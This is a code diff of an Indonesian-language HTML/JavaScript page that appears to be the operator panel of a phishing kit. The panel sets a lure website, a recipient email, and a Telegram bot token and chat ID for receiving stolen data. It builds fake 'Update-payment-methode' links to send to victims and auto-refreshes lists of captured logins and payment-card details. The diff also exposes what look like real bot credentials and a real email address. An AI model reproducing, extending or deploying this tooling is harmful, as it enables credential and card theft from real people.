@@ -95,33 +95,29 @@
             <p>Pengaturan & Pembuatan Tautan</p>
         </div>
 
-        <!-- PENGATURAN UMUM -->
+        <!-- PENGATURAN DASAR -->
         <div class="kotak">
-            <h2>⚙️ Pengaturan Dasar</h2>
+            <h2>⚙️ Pengaturan</h2>
             
-            <label>Alamat Website (Tanpa Parameter)</label>
-            <input type="text" id="websiteUrl" placeholder="https://namamu.pythonanywhere.com">
+            <label>Alamat Website</label>
+            <input type="text" id="websiteUrl" placeholder="https://update-accountservice.onrender.com" oninput="simpanOtomatis()">
             
-            <label>Email Penerima Data</label>
-            <input type="email" id="emailTujuan" placeholder="email@tujuan.com">
+            <label>Email Penerima</label>
+            <input type="email" id="emailTujuan" placeholder="jandaanaksatu777@gmail.com" oninput="simpanOtomatis()">
             
             <label>Telegram Bot Token</label>
-            <input type="text" id="botToken" placeholder="xxx:yyy">
+            <input type="text" id="botToken" placeholder="8813734294:AAHiumNTKCD4YWZS2jq5lBjHFtFbjwtzmYk" oninput="simpanOtomatis()">
             
             <label>Telegram Chat ID</label>
-            <input type="text" id="chatIdTelegram" placeholder="123456789">
+            <input type="text" id="chatIdTelegram" placeholder="7808815199" oninput="simpanOtomatis()">
 
-            <button class="btn-simpan" onclick="simpanPengaturan()">💾 Simpan Pengaturan</button>
-            <p class="berhasil" id="pesanBerhasil">✅ Pengaturan tersimpan!</p>
-            <p class="info">Pengaturan tersimpan otomatis, tidak hilang saat di-refresh</p>
+            <p class="berhasil" id="pesanBerhasil">✅ Tersimpan Otomatis!</p>
+            <p class="info">Semua perubahan tersimpan langsung, tidak hilang saat di-refresh</p>
         </div>
 
-        <!-- GENERATOR PARAMETER TAUTAN -->
+        <!-- GENERATOR PARAMETER -->
         <div class="kotak">
-            <h2>🔗 Buat Tautan Parameter</h2>
-            
-            <label>Email Pengguna</label>
-            <input type="email" id="paramEmail" placeholder="email@pengguna.com" oninput="buatTautan()">
+            <h2>🔗 Format Parameter Tautan</h2>
             
             <label>Nomor Acak</label>
             <div class="baris-dua">
@@ -131,10 +127,13 @@
 
             <label>Tautan Lengkap</label>
             <div class="tautan-hasil" id="tautanHasil">
-                Isi Email & Nomor di atas...
+                Isi nomor di atas...
             </div>
             <button class="salin-btn" onclick="salinTautan()">📋 Salin Tautan</button>
-            <p class="info" style="margin-top:8px;">Format: ?Update-payment-methode-{email}-{nomor}=aktif</p>
+            <p class="info" style="margin-top:8px;">
+                Format: <code>?Update-payment-methode-EMAIL-ANGKA=aktif</code><br>
+                Ganti <strong>EMAIL</strong> dengan alamat yang diinginkan, <strong>ANGKA</strong> otomatis diganti
+            </p>
         </div>
 
         <!-- REFRESH OTOMATIS -->
@@ -144,7 +143,7 @@
                 ▶️ Mulai Refresh Setiap 10 Detik
             </button>
             <span class="status-refresh" id="statusRefresh">Nonaktif</span>
-            <p class="info">Interval: 10 detik | Halaman akan memuat ulang daftar data secara otomatis</p>
+            <p class="info">Interval: 10 detik — daftar data diperbarui otomatis</p>
             <p class="waktu" id="waktuTerakhir">Terakhir diperiksa: —</p>
         </div>
 
@@ -170,7 +169,7 @@
         const INTERVAL_DETIK = 10;
 
         // === MUAT DATA SAAT BUKA HALAMAN ===
-        function muatPengaturan() {
+        document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('websiteUrl').value = localStorage.getItem('websiteUrl') || '';
             document.getElementById('emailTujuan').value = localStorage.getItem('emailTujuan') || '';
             document.getElementById('botToken').value = localStorage.getItem('botTokenTelegram') || '';
@@ -179,10 +178,10 @@
             tampilkanDataMasuk();
             perbaruiWaktuTerakhir();
             buatTautan();
-        }
+        });
 
-        // === SIMPAN PENGATURAN ===
-        function simpanPengaturan() {
+        // === SIMPAN OTOMATIS SAAT DIUBAH ===
+        function simpanOtomatis() {
             localStorage.setItem('websiteUrl', document.getElementById('websiteUrl').value.trim());
             localStorage.setItem('emailTujuan', document.getElementById('emailTujuan').value.trim());
             localStorage.setItem('botTokenTelegram', document.getElementById('botToken').value.trim());
@@ -190,25 +189,23 @@
             
             const pesan = document.getElementById('pesanBerhasil');
             pesan.style.display = 'block';
-            setTimeout(() => pesan.style.display = 'none', 3000);
+            setTimeout(() => pesan.style.display = 'none', 1500);
             
             buatTautan();
         }
 
-        // === BUAT TAUTAN LENGKAP ===
+        // === BUAT TAUTAN ===
         function buatTautan() {
             const url = document.getElementById('websiteUrl').value.trim();
-            const email = document.getElementById('paramEmail').value.trim();
             const angka = document.getElementById('paramAngka').value.trim();
             const hasil = document.getElementById('tautanHasil');
             
-            if (!url || !email || !angka) {
-                hasil.innerHTML = '<span style="color:#888;">Isi Email & Nomor di atas...</span>';
+            if (!url || !angka) {
+                hasil.innerHTML = '<span style="color:#888;">Isi nomor di atas...</span>';
                 return;
             }
             
-            const tautanLengkap = `${url}/?Update-payment-methode-${email}-${angka}=aktif`;
-            hasil.innerHTML = tautanLengkap;
+            hasil.innerHTML = `${url}/?Update-payment-methode-EMAIL-${angka}=aktif`;
         }
 
         // === BUAT ANGKA ACAK ===
@@ -223,17 +220,18 @@
             const teks = document.getElementById('tautanHasil').innerText;
             if (!teks.includes('Isi')) {
                 navigator.clipboard.writeText(teks).then(() => {
-                    alert('✅ Tautan disalin!');
+                    alert('✅ Tautan disalin! Ganti kata EMAIL dengan alamat yang diinginkan');
                 });
             }
         }
 
-        // === REFRESH OTOMATIS ===
+        // === REFRESH OTOMATIS — DIPERBAIKI ===
         function toggleRefreshOtomatis() {
             const tombol = document.getElementById('tombolRefreshOtomatis');
             const status = document.getElementById('statusRefresh');
             
             if (intervalRefresh) {
+                // MATIKAN
                 clearInterval(intervalRefresh);
                 intervalRefresh = null;
                 tombol.textContent = '▶️ Mulai Refresh Setiap 10 Detik';
@@ -241,8 +239,10 @@
                 status.textContent = 'Nonaktif';
                 status.classList.remove('aktif');
             } else {
+                // NYALAKAN — langsung perbarui sekali
                 tampilkanDataMasuk();
-                intervalRefresh = setInterval(() => {
+                perbaruiWaktuTerakhir();
+                intervalRefresh = setInterval(function() {
                     tampilkanDataMasuk();
                     perbaruiWaktuTerakhir();
                 }, INTERVAL_DETIK * 1000);
@@ -253,8 +253,9 @@
             }
         }
 
-        // === TAMPILKAN DATA MASUK ===
+        // === TAMPILKAN DATA ===
         function tampilkanDataMasuk() {
+            // Data Login
             const daftarLogin = document.getElementById('daftarLogin');
             const dataLogin = JSON.parse(localStorage.getItem('daftarLogin') || '[]');
             if (dataLogin.length === 0) {
@@ -269,6 +270,7 @@
                 `).join('');
             }
 
+            // Data Kartu
             const daftarKartu = document.getElementById('daftarKartu');
             const dataKartu = JSON.parse(localStorage.getItem('daftarKartu') || '[]');
             if (dataKartu.length === 0) {
@@ -293,8 +295,6 @@
             document.getElementById('waktuTerakhir').textContent = 
                 'Terakhir diperiksa: ' + new Date().toLocaleString();
         }
-
-        document.addEventListener('DOMContentLoaded', muatPengaturan);
     </script>
 </body>
 </html>
